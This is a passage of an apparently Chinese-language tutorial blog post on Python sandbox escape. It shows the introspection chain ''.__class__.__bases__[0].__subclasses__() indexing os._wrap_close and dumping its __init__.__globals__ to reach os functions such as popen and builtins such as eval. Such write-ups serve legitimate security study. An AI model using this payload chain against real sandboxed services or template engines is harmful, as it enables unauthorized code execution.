class="string">'itertools.cycle'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.dropwhile'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.takewhile'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.islice'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.starmap'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.chain'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.compress'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.filterfalse'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.count'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.zip_longest'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.permutations'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.product'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.repeat'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools.groupby'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools._grouper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools._tee'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'itertools._tee_dataobject'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'operator.itemgetter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'operator.attrgetter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'operator.methodcaller'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'reprlib.Repr'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections.deque'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_collections._deque_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_collections._deque_reverse_iterator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_collections._tuplegetter'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'collections._Link'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'functools.partial'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'functools._lru_cache_wrapper'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'functools.partialmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'functools.singledispatchmethod'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'functools.cached_property'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'contextlib.ContextDecorator'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'contextlib._GeneratorContextManagerBase'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'contextlib._BaseExitStack'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'enum.auto'</span>&gt;, &lt;enum <span class="string">'Enum'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'re.Pattern'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'re.Match'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'_sre.SRE_Scanner'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'sre_parse.State'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'sre_parse.SubPattern'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'sre_parse.Tokenizer'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'re.Scanner'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing._Final'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing._Immutable'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.Generic'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing._TypingEmpty'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing._TypingEllipsis'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.Annotated'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.NamedTuple'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.TypedDict'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.io'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'typing.re'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'importlib.abc.Finder'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'importlib.abc.Loader'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'importlib.abc.ResourceReader'</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">'rlcompleter.Completer'</span>&gt;]</span><br></pre></td></tr></tbody></table></figure>
<p>找到需要使用的类，其中有可以使用的类</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">'os._wrap_close'</span>&gt;,&lt;<span class="keyword">class</span> <span class="string">'warnings.WarningMessage'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>调用他们</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>]  <span class="comment"># 是在上面列表中的第134个值,由于是数组所以填133</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'os._wrap_close'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">140</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">'warnings.catch_warnings'</span>&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>然后查看里面有什么可以利用的函数</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">133</span>].__init__.__globals__</span><br><span class="line">{<span class="string">'__name__'</span>: <span class="string">'os'</span>, <span class="string">'__doc__'</span>: <span class="string">"OS routines for NT or Posix depending on what system we're on.\n\nThis exports:\n  - all functions from posix or nt, e.g. unlink, stat, etc.\n  - os.path is either posixpath or ntpath\n  - os.name is either 'posix' or 'nt'\n  - os.curdir is a string representing the current directory (always '.')\n  - os.pardir is a string representing the parent directory (always '..')\n  - os.sep is the (or a most common) pathname separator ('/' or '\\\\')\n  - os.extsep is the extension separator (always '.')\n  - os.altsep is the alternate pathname separator (None or '/')\n  - os.pathsep is the component separator used in $PATH etc\n  - os.linesep is the line separator in text files ('\\r' or '\\n' or '\\r\\n')\n  - os.defpath is the default search path for executables\n  - os.devnull is the file path of the null device ('/dev/null', etc.)\n\nPrograms that import and use 'os' stand a better chance of being\nportable between different platforms.  Of course, they must then\nonly use functions that are defined by all platforms (e.g., unlink\nand opendir), and leave all pathname manipulation to os.path\n(e.g., split and join).\n"</span>, <span class="string">'__package__'</span>: <span class="string">''</span>, <span class="string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, <span class="string">'__spec__'</span>: ModuleSpec(name=<span class="string">'os'</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x7fc7ef53bbb0</span>&gt;, origin=<span class="string">'/usr/lib/python3.9/os.py'</span>), <span class="string">'__file__'</span>: <span class="string">'/usr/lib/python3.9/os.py'</span>, <span class="string">'__cached__'</span>: <span class="string">'/usr/lib/python3.9/__pycache__/os.cpython-39.pyc'</span>, <span class="string">'__builtins__'</span>: {<span class="string">'__name__'</span>: <span class="string">'builtins'</span>, <span class="string">'__doc__'</span>: <span class="string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>, <span class="string">'__package__'</span>: <span class="string">''</span>, <span class="string">'__loader__'</span>: &lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="string">'__spec__'</span>: ModuleSpec(name=<span class="string">'builtins'</span>, loader=&lt;<span class="keyword">class</span> <span class="string">'_frozen_importlib.BuiltinImporter'</span>&gt;, origin=<span class="string">'built-in'</span>), <span class="string">'__build_class__'</span>: &lt;built-<span class="keyword">in</span> function __build_class__&gt;, <span class="string">'__import__'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;, <span class="string">'abs'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;, <span class="string">'all'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">all</span>&gt;, <span class="string">'any'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">any</span>&gt;, <span class="string">'ascii'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ascii</span>&gt;, <span class="string">'bin'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">bin</span>&gt;, <span class="string">'breakpoint'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">breakpoint</span>&gt;, <span class="string">'callable'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">callable</span>&gt;, <span class="string">'chr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">chr</span>&gt;, <span class="string">'compile'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">compile</span>&gt;, <span class="string">'delattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">delattr</span>&gt;, <span class="string">'dir'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">dir</span>&gt;, <span class="string">'divmod'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">divmod</span>&gt;, <span class="string">'eval'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;, <span class="string">'exec'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">exec</span>&gt;, <span class="string">'format'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">format</span>&gt;, <span class="string">'getattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">getattr</span>&gt;, <span class="string">'globals'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">globals</span>&gt;, <span class="string">'hasattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hasattr</span>&gt;, <span class="string">'hash'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hash</span>&gt;, <span class="string">'hex'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">hex</span>&gt;, <span class="string">'id'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">id</span>&gt;, <span class="string">'input'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">input</span>&gt;, <span class="string">'isinstance'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">isinstance</span>&gt;, <span class="string">'issubclass'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">issubclass</span>&gt;, <span class="string">'iter'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">iter</span>&gt;, <span class="string">'len'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">len</span>&gt;, <span class="string">'locals'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">locals</span>&gt;, <span class="string">'max'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">max</span>&gt;, <span class="string">'min'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">min</span>&gt;, <span class="string">'next'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">next</span>&gt;, <span class="string">'oct'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">oct</span>&gt;, <span class="string">'ord'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">ord</span>&gt;, <span class="string">'pow'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">pow</span>&gt;, <span class="string">'print'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">print</span>&gt;, <span class="string">'repr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">repr</span>&gt;, <span class="string">'round'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">round</span>&gt;, <span class="string">'setattr'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">setattr</span>&gt;, <span class="string">'sorted'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sorted</span>&gt;, <span class="string">'sum'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">sum</span>&gt;, <span class="string">'vars'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">vars</span>&gt;, <span class="string">'None'</span>: <span class="literal">None</span>, <span class="string">'Ellipsis'</span>: <span class="literal">Ellipsis</span>, <span class="string">'NotImplemented'</span>: <span class="literal">NotImplemented</span>, <span class="string">'False'</span>: <span class="literal">False</span>, <span class="string">'True'</span>: <span class="literal">True</span>, <span class="string">'bool'</span>: &lt;<span class="keyword">class</span> <span class="string">'bool'</span>&gt;, <span class="string">'memoryview'</span>: &lt;<span class="keyword">class</span> <span class="string">'memoryview'</span>&gt;, <span class="string">'bytearray'</span>: &lt;<span class="keyword">class</span> <span class="string">'bytearray'</span>&gt;, <span class="string">'bytes'</span>: &lt;<span class="keyword">class</span> <span class="string">'bytes'</span>&gt;, <span class="string">'classmethod'</span>: &lt;<span class="keyword">class</span> <span class="string">'classmethod'</span>&gt;, <span class="string">'complex'</span>: &lt;<span class="keyword">class</span> <span class="string">'complex'</span>&gt;, <span class="string">'dict'</span>: &lt;<span class="keyword">class</span> <span class="string">'dict'</span>&gt;, <span class="string">'enumerate'</span>: &lt;<span class="keyword">class</span> <span class="string">'enumerate'</span>&gt;, <span class="string">'filter'</span>: &lt;<span class="keyword">class</span> <span class="string">'filter'</span>&gt;, <span class="string">'float'</span>: &lt;<span class="keyword">class</span> <span class="string">'float'</span>&gt;, <span class="string">'frozenset'</span>: &lt;<span class="keyword">class</span> <span class="string">'frozenset'</span>&gt;, <span class="string">'property'</span>: &lt;<span class="keyword">class</span> <span class="string">'property'</span>&gt;, <span class="string">'int'</span>: &lt;<span class="keyword">class</span> <span class="string">'int'</span>&gt;, <span class="string">'list'</span>: &lt;<span class="keyword">class</span> <span class="string">'list'</span>&gt;, <span class="string">'map'</span>: &lt;<span class="keyword">class</span> <span class="string">'map'</span>&gt;, <span class="string">'object'</span>: &lt;<span class="keyword">class</span> <span class="string">'object'</span>&gt;, <span class="string">'range'</span>: &lt;<span class="keyword">class</span> <span class="string">'range'</span>&gt;, <span class="string">'reversed'</span>: &lt;<span class="keyword">class</span> <span class="string">'reversed'</span>&gt;, <span class="string">'set'</span>: &lt;<span class="keyword">class</span> <span class="string">'set'</span>&gt;, <span class="string">'slice'</span>: &lt;<span class="keyword">class</span> <span class="string">'slice'</span>&gt;, <span class="string">'staticmethod'</span>: &lt;<span class="keyword">class</span> <span class="string">'staticmethod'</span>&gt;, <span class="string">'str'</span>: &lt;<span class="keyword">class</span> <span class="string">'str'</span>&gt;, <span class="string">'super'</span>: &lt;<span class="keyword">class</span> <span class="string">'super'</span>&gt;, <span class="string">'tuple'</span>: &lt;<span class="keyword">class</span> <span class="string">'tuple'</span>&gt;, <span class="string">'type'</span>: &lt;<span class="keyword">class</span> <span class="string">'type'</span>&gt;, <span class="string">'zip'</span>: &lt;<span class="keyword">class</span> <span class="string">'zip'</span>&gt;, <span class="string">'__debug__'</span>: <span class="literal">True</span>, <span class="string">'BaseException'</span>: &lt;<span class="keyword">class</span> <span class="string">'BaseException'</span>&gt;, <span class="string">'Exception'</span>: &lt;<span class="keyword">class</span> <span class="string">'Exception'</span>&gt;, <span class="string">'TypeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'TypeError'</span>&gt;, <span class="string">'StopAsyncIteration'</span>: &lt;<span class="keyword">class</span> <span class="string">'StopAsyncIteration'</span>&gt;, <span class="string">'StopIteration'</span>: &lt;<span class="keyword">class</span> <span class="string">'StopIteration'</span>&gt;, <span class="string">'GeneratorExit'</span>: &lt;<span class="keyword">class</span> <span class="string">'GeneratorExit'</span>&gt;, <span class="string">'SystemExit'</span>: &lt;<span class="keyword">class</span> <span class="string">'SystemExit'</span>&gt;, <span class="string">'KeyboardInterrupt'</span>: &lt;<span class="keyword">class</span> <span class="string">'KeyboardInterrupt'</span>&gt;, <span class="string">'ImportError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ImportError'</span>&gt;, <span class="string">'ModuleNotFoundError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ModuleNotFoundError'</span>&gt;, <span class="string">'OSError'</span>: &lt;<span class="keyword">class</span> <span class="string">'OSError'</span>&gt;, <span class="string">'EnvironmentError'</span>: &lt;<span class="keyword">class</span> <span class="string">'OSError'</span>&gt;, <span class="string">'IOError'</span>: &lt;<span class="keyword">class</span> <span class="string">'OSError'</span>&gt;, <span class="string">'EOFError'</span>: &lt;<span class="keyword">class</span> <span class="string">'EOFError'</span>&gt;, <span class="string">'RuntimeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'RuntimeError'</span>&gt;, <span class="string">'RecursionError'</span>: &lt;<span class="keyword">class</span> <span class="string">'RecursionError'</span>&gt;, <span class="string">'NotImplementedError'</span>: &lt;<span class="keyword">class</span> <span class="string">'NotImplementedError'</span>&gt;, <span class="string">'NameError'</span>: &lt;<span class="keyword">class</span> <span class="string">'NameError'</span>&gt;, <span class="string">'UnboundLocalError'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnboundLocalError'</span>&gt;, <span class="string">'AttributeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'AttributeError'</span>&gt;, <span class="string">'SyntaxError'</span>: &lt;<span class="keyword">class</span> <span class="string">'SyntaxError'</span>&gt;, <span class="string">'IndentationError'</span>: &lt;<span class="keyword">class</span> <span class="string">'IndentationError'</span>&gt;, <span class="string">'TabError'</span>: &lt;<span class="keyword">class</span> <span class="string">'TabError'</span>&gt;, <span class="string">'LookupError'</span>: &lt;<span class="keyword">class</span> <span class="string">'LookupError'</span>&gt;, <span class="string">'IndexError'</span>: &lt;<span class="keyword">class</span> <span class="string">'IndexError'</span>&gt;, <span class="string">'KeyError'</span>: &lt;<span class="keyword">class</span> <span class="string">'KeyError'</span>&gt;, <span class="string">'ValueError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ValueError'</span>&gt;, <span class="string">'UnicodeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnicodeError'</span>&gt;, <span class="string">'UnicodeEncodeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnicodeEncodeError'</span>&gt;, <span class="string">'UnicodeDecodeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnicodeDecodeError'</span>&gt;, <span class="string">'UnicodeTranslateError'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnicodeTranslateError'</span>&gt;, <span class="string">'AssertionError'</span>: &lt;<span class="keyword">class</span> <span class="string">'AssertionError'</span>&gt;, <span class="string">'ArithmeticError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ArithmeticError'</span>&gt;, <span class="string">'FloatingPointError'</span>: &lt;<span class="keyword">class</span> <span class="string">'FloatingPointError'</span>&gt;, <span class="string">'OverflowError'</span>: &lt;<span class="keyword">class</span> <span class="string">'OverflowError'</span>&gt;, <span class="string">'ZeroDivisionError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ZeroDivisionError'</span>&gt;, <span class="string">'SystemError'</span>: &lt;<span class="keyword">class</span> <span class="string">'SystemError'</span>&gt;, <span class="string">'ReferenceError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ReferenceError'</span>&gt;, <span class="string">'MemoryError'</span>: &lt;<span class="keyword">class</span> <span class="string">'MemoryError'</span>&gt;, <span class="string">'BufferError'</span>: &lt;<span class="keyword">class</span> <span class="string">'BufferError'</span>&gt;, <span class="string">'Warning'</span>: &lt;<span class="keyword">class</span> <span class="string">'Warning'</span>&gt;, <span class="string">'UserWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'UserWarning'</span>&gt;, <span class="string">'DeprecationWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'DeprecationWarning'</span>&gt;, <span class="string">'PendingDeprecationWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'PendingDeprecationWarning'</span>&gt;, <span class="string">'SyntaxWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'SyntaxWarning'</span>&gt;, <span class="string">'RuntimeWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'RuntimeWarning'</span>&gt;, <span class="string">'FutureWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'FutureWarning'</span>&gt;, <span class="string">'ImportWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'ImportWarning'</span>&gt;, <span class="string">'UnicodeWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'UnicodeWarning'</span>&gt;, <span class="string">'BytesWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'BytesWarning'</span>&gt;, <span class="string">'ResourceWarning'</span>: &lt;<span class="keyword">class</span> <span class="string">'ResourceWarning'</span>&gt;, <span class="string">'ConnectionError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ConnectionError'</span>&gt;, <span class="string">'BlockingIOError'</span>: &lt;<span class="keyword">class</span> <span class="string">'BlockingIOError'</span>&gt;, <span class="string">'BrokenPipeError'</span>: &lt;<span class="keyword">class</span> <span class="string">'BrokenPipeError'</span>&gt;, <span class="string">'ChildProcessError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ChildProcessError'</span>&gt;, <span class="string">'ConnectionAbortedError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ConnectionAbortedError'</span>&gt;, <span class="string">'ConnectionRefusedError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ConnectionRefusedError'</span>&gt;, <span class="string">'ConnectionResetError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ConnectionResetError'</span>&gt;, <span class="string">'FileExistsError'</span>: &lt;<span class="keyword">class</span> <span class="string">'FileExistsError'</span>&gt;, <span class="string">'FileNotFoundError'</span>: &lt;<span class="keyword">class</span> <span class="string">'FileNotFoundError'</span>&gt;, <span class="string">'IsADirectoryError'</span>: &lt;<span class="keyword">class</span> <span class="string">'IsADirectoryError'</span>&gt;, <span class="string">'NotADirectoryError'</span>: &lt;<span class="keyword">class</span> <span class="string">'NotADirectoryError'</span>&gt;, <span class="string">'InterruptedError'</span>: &lt;<span class="keyword">class</span> <span class="string">'InterruptedError'</span>&gt;, <span class="string">'PermissionError'</span>: &lt;<span class="keyword">class</span> <span class="string">'PermissionError'</span>&gt;, <span class="string">'ProcessLookupError'</span>: &lt;<span class="keyword">class</span> <span class="string">'ProcessLookupError'</span>&gt;, <span class="string">'TimeoutError'</span>: &lt;<span class="keyword">class</span> <span class="string">'TimeoutError'</span>&gt;, <span class="string">'open'</span>: &lt;built-<span class="keyword">in</span> function <span class="built_in">open</span>&gt;, <span class="string">'quit'</span>: Use quit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">'exit'</span>: Use exit() <span class="keyword">or</span> Ctrl-D (i.e. EOF) to exit, <span class="string">'copyright'</span>: Copyright (c) <span class="number">2001</span>-<span class="number">2022</span> Python Software Foundation.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span> BeOpen.com.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1995</span>-<span class="number">2001</span> Corporation <span class="keyword">for</span> National Research Initiatives.</span><br><span class="line">All Rights Reserved.</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">1991</span>-<span class="number">1995</span> Stichting Mathematisch Centrum, Amsterdam.</span><br><span class="line">All Rights Reserved., <span class="string">'credits'</span>:     Thanks to CWI, CNRI, BeOpen.com, Zope Corporation <span class="keyword">and</span> a cast of thousands</span><br><span class="line">    <span class="keyword">for</span> supporting Python development.  See www.python.org <span class="keyword">for</span> more information., <span class="string">'license'</span>: <span class="type">Type</span> license() to see the full license text, <span class="string">'help'</span>: <span class="type">Type</span> <span class="built_in">help</span>() <span class="keyword">for</span> interactive <span class="built_in">help</span>, <span class="keyword">or</span> <span class="built_in">help</span>(<span class="built_in">object</span>) <span class="keyword">for</span> <span class="built_in">help</span> about <span class="built_in">object</span>., <span class="string">'_'</span>: <span class="literal">None</span>}, <span class="string">'abc'</span>: &lt;module <span class="string">'abc'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python3.9/abc.py'</span>&gt;, <span class="string">'sys'</span>: &lt;module <span class="string">'sys'</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">'st'</span>: &lt;module <span class="string">'stat'</span> <span class="keyword">from</span> <span class="string">'/usr/lib/python3.9/stat.py'</span>&gt;, <span class="string">'_check_methods'</span>: &lt;function _check_methods at <span class="number">0x7fc7ef547a60</span>&gt;, <span class="string">'GenericAlias'</span>: &lt;<span class="keyword">class</span> <span class="string">'types.GenericAlias'</span>&gt;, <span class="string">'__all__'</span>: [<span class="string">'altsep'</span>, <span class="string">'curdir'</span>, <span class="string">'pardir'</span>, <span class="string">'sep'</span>, <span class="string">'pathsep'</span>, <span class="string">'linesep'</span>, <span class="string">'defpath'</span>, <span class="string">'name'</span>, <span class="string">'path'</span>, <span class="string">'devnull'</span>, <span class="string">'SEEK_SET'</span>, <span class="string">'SEEK_CUR'</span>, <span class="string">'SEEK_END'</span>, <span class="string">'fsencode'</span>, <span class="string">'fsdecode'</span>, <span class="string">'get_exec_path'</span>, <span class="string">'fdopen'</span>, <span class="string">'popen'</span>, <span class="string">'extsep'</span>, <span class="string">'_exit'</span>, <span class="string">'CLD_CONTINUED'</span>, <span class="string">'CLD_DUMPED'</span>, <span class="string">'CLD_EXITED'</span>, <span class="string">'CLD_KILLED'</span>, <span class="string">'CLD_STOPPED'</span>, <span class="string">'CLD_TRAPPED'</span>, <span class="string">'DirEntry'</span>, <span class="string">'EX_CANTCREAT'</span>, <span class="string">'EX_CONFIG'</span>, <span class="string">'EX_DATAERR'</span>, <span class="string">'EX_IOERR'</span>, <span class="string">'EX_NOHOST'</span>, <span class="string">'EX_NOINPUT'</span>, <span class="string">'EX_NOPERM'</span>, <span class="string">'EX_NOUSER'</span>, <span class="string">'EX_OK'</span>, <span class="string">'EX_OSERR'</span>, <span class="string">'EX_OSFILE'</span>, <span class="string">'EX_PROTOCOL'</span>, <span class="string">'EX_SOFTWARE'</span>, <span class="string">'EX_TEMPFAIL'</span>, <span class="string">'EX_UNAVAILABLE'</span>, <span class="string">'EX_USAGE'</span>, <span class="string">'F_LOCK'</span>, <span class="string">'F_OK'</span>, <span class="string">'F_TEST'</span>, <span class="string">'F_TLOCK'</span>, <span class="string">'F_ULOCK'</span>, <span class="string">'GRND_NONBLOCK'</span>, <span class="string">'GRND_RANDOM'</span>, <span class="string">'MFD_ALLOW_SEALING'</span>, <span class="string">'MFD_CLOEXEC'</span>, <span class="string">'MFD_HUGETLB'</span>, <span class="string">'MFD_HUGE_16GB'</span>, <span class="string">'MFD_HUGE_16MB'</span>, <span class="string">'MFD_HUGE_1GB'</span>, <span class="string">'MFD_HUGE_1MB'</span>, <span class="string">'MFD_HUGE_256MB'</span>, <span class="string">'MFD_HUGE_2GB'</span>, <span class="string">'MFD_HUGE_2MB'</span>, <span class="string">'MFD_HUGE_32MB'</span>, <span class="string">'MFD_HUGE_512KB'</span>, <span class="string">'MFD_HUGE_512MB'</span>, <span class="string">'MFD_HUGE_64KB'</span>, <span class="string">'MFD_HUGE_8MB'</span>, <span class="string">'MFD_HUGE_MASK'</span>, <span class="string">'MFD_HUGE_SHIFT'</span>, <span class="string">'NGROUPS_MAX'</span>, <span class="string">'O_ACCMODE'</span>, <span class="string">'O_APPEND'</span>, <span class="string">'O_ASYNC'</span>, <span class="string">'O_CLOEXEC'</span>, <span class="string">'O_CREAT'</span>, <span class="string">'O_DIRECT'</span>, <span class="string">'O_DIRECTORY'</span>, <span class="string">'O_DSYNC'</span>, <span class="string">'O_EXCL'</span>, <span class="string">'O_LARGEFILE'</span>, <span class="string">'O_NDELAY'</span>, <span class="string">'O_NOATIME'</span>, <span class="string">'O_NOCTTY'</span>, <span class="string">'O_NOFOLLOW'</span>, <span class="string">'O_NONBLOCK'</span>, <span class="string">'O_PATH'</span>, <span class="string">'O_RDONLY'</span>, <span class="string">'O_RDWR'</span>, <span class="string">'O_RSYNC'</span>, <span class="string">'O_SYNC'</span>, <span class="string">'O_TMPFILE'</span>, <span class="string">'O_TRUNC'</span>, <span class="string">'O_WRONLY'</span>, <span class="string">'POSIX_FADV_DONTNEED'</span>, <span class="string">'POSIX_FADV_NOREUSE'</span>, <span class="string">'POSIX_FADV_NORMAL'</span>, <span class="string">'POSIX_FADV_RANDOM'</span>, <span class="string">'POSIX_FADV_SEQUENTIAL'</span>, <span class="string">'POSIX_FADV_WILLNEED'</span>, <span class="string">'POSIX_SPAWN_CLOSE'</span>, <span class="string">'POSIX_SPAWN_DUP2'</span>, <span class="string">'POSIX_SPAWN_OPEN'</span>, <span class="string">'PRIO_PGRP'</span>, <span class="string">'PRIO_PROCESS'</span>, <span class="string">'PRIO_USER'</span>, <span class="string">'P_ALL'</span>, <span class="string">'P_PGID'</span>, <span class="string">'P_PID'</span>, <span class="string">'P_PIDFD'</span>, <span class="string">'RTLD_DEEPBIND'</span>, <span class="string">'RTLD_GLOBAL'</span>, <span 